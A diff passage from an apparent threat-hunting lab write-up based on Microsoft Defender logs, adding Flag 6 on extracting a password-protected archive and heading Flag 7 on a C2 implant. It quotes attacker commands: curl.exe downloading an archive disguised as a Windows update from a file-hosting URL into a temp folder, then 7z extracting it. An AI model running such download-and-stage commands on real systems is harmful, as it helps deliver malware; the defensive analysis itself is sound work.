@@ -76,3 +76,17 @@ Microsoft Defender for Endpoint Logs
 
 **Finding**:
 - **Command**: "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
+
+### 🔹 Flag 6 – EXECUTION - Archive Extraction Command
+**Objective**: Identify the command used to extract the password-protected archive
+
+**KQL Query**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20113521.png?raw=true)
+
+**Result:**
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20113726.png?raw=true)
+
+**Finding**:
+- **Command**: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
+
+### 🔹 Flag 7 – PERSISTENCE - C2 Implant
